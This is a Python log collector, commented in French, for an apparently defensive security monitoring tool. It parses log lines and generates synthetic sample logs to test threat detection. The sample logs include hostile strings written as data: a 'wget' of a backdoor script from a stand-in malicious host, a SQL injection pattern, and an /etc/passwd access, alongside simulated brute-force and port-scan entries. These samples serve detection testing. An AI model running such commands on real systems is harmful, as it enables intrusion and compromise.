import os
import re
import json
import random
from datetime import datetime
from database import Database
from analyzer import SecurityAnalyzer

class LogCollector:
    def __init__(self):
        self.db = Database()
        self.analyzer = SecurityAnalyzer()
        
    def parse_log_line(self, line, source='system'):
        """Parser une ligne de log et extraire les informations importantes"""
        log_data = {
            'source': source,
            'level': 'INFO',
            'message': line.strip(),
            'ip_address': None,
            'user': None,
            'raw_log': line
        }
        
        # Extraire l'IP si présente
        ip_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        ip_match = re.search(ip_pattern, line)
        if ip_match:
            log_data['ip_address'] = ip_match.group(1)
        
        # Extraire le niveau de log
        if 'error' in line.lower() or 'fail' in line.lower():
            log_data['level'] = 'ERROR'
        elif 'warn' in line.lower():
            log_data['level'] = 'WARNING'
        elif 'critical' in line.lower() or 'fatal' in line.lower():
            log_data['level'] = 'CRITICAL'
        
        # Extraire le nom d'utilisateur si présent
        user_patterns = [
            r'user[=:\s]+(\w+)',
            r'username[=:\s]+(\w+)',
            r'login[=:\s]+(\w+)',
            r'for\s+(\w+)@'
        ]
        for pattern in user_patterns:
            user_match = re.search(pattern, line, re.IGNORECASE)
            if user_match:
                log_data['user'] = user_match.group(1)
                break
        
        return log_data
    
    def collect_from_file(self, filepath, source='system'):
        """Collecter les logs depuis un fichier"""
        if not os.path.exists(filepath):
            print(f"Fichier non trouvé: {filepath}")
            return
        
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if line.strip():
                    log_data = self.parse_log_line(line, source)
                    self.process_log(log_data)
    
    def process_log(self, log_data):
        """Traiter un log: l'enregistrer et l'analyser"""
        # Enregistrer dans la base
        self.db.add_log(
            source=log_data['source'],
            level=log_data['level'],
            message=log_data['message'],
            ip_address=log_data['ip_address'],
            user=log_data['user'],
            raw_log=log_data['raw_log']
        )
        
        # Analyser pour détecter des menaces
        self.analyzer.analyze_log(log_data)
    
    def generate_sample_logs(self):
        """Générer des logs d'exemple pour tester le système"""
        sample_ips = [
            '192.168.1.100', '192.168.1.101', '10.0.0.50',
            '172.16.0.10', '8.8.8.8', '1.1.1.1',
            '123.45.67.89', '98.76.54.32'
        ]
        
        sample_users = ['admin', 'user1', 'john', 'alice', 'bob', 'test', 'guest']
        
        sample_logs = [
            # Logs normaux
            "INFO: User {user} logged in successfully from {ip}",
            "INFO: System backup completed successfully",
            "INFO: Service started on port {port}",
            "INFO: File uploaded by {user} from {ip}",
            
            # Logs d'erreur bénins
            "WARNING: Disk usage at 80%",
            "ERROR: Failed to connect to database (retry in 5s)",
            
            # Logs suspects pour tester la détection
            "ERROR: Failed password for {user} from {ip}",
            "WARNING: Invalid user {user} from {ip}",
            "ERROR: Authentication failure for {user} from {ip}",
            "INFO: Connection attempt on port {port} from {ip}",
            "WARNING: Suspicious query detected: SELECT * FROM users WHERE id=1 OR 1=1",
            "ERROR: Unauthorized access attempt from {ip}",
            "WARNING: Command executed: wget http://malicious.com/backdoor.sh",
            "CRITICAL: Multiple login failures for admin from {ip}",
            "INFO: Port scan detected from {ip}",
            "ERROR: SQL injection attempt blocked from {ip}",
            "WARNING: Suspicious file access: /etc/passwd from {ip}"
        ]
        
        # Générer 50 logs aléatoires
        for _ in range(50):
            log_template = random.choice(sample_logs)
            ip = random.choice(sample_ips)
            user = random.choice(sample_users)
            port = random.randint(20, 9999)
            
            log_message = log_template.format(
                user=user,
                ip=ip,
                port=port
            )
            
            log_data = self.parse_log_line(log_message, source='demo')
            self.process_log(log_data)
        
        # Simuler une attaque de brute force
        attacker_ip = '192.168.1.99'
        for i in range(7):
            log_message = f"ERROR: Failed password for admin from {attacker_ip}"
            log_data = self.parse_log_line(log_message, source='ssh')
            self.process_log(log_data)
        
        # Simuler un scan de ports
        scanner_ip = '10.10.10.10'
        for port in range(20, 40):
            log_message = f"INFO: Connection attempt on port {port} from {scanner_ip}"
            log_data = self.parse_log_line(log_message, source='firewall')
            self.process_log(log_data)
        
        print("Logs d'exemple générés avec succès!")
    
    def monitor_directory(self, directory='../logs', source='system'):
        """Surveiller un répertoire pour de nouveaux logs"""
        # Pour une version simple, on lit juste les fichiers existants
        # Dans une vraie version, on pourrait utiliser watchdog pour surveiller en temps réel
        if not os.path.exists(directory):
            os.makedirs(directory)
            
        for filename in os.listdir(directory):
            if filename.endswith('.log'):
                filepath = os.path.join(directory, filename)
                self.collect_from_file(filepath, source)

if __name__ == "__main__":
    # Test du collecteur
    collector = LogCollector()
    collector.generate_sample_logs()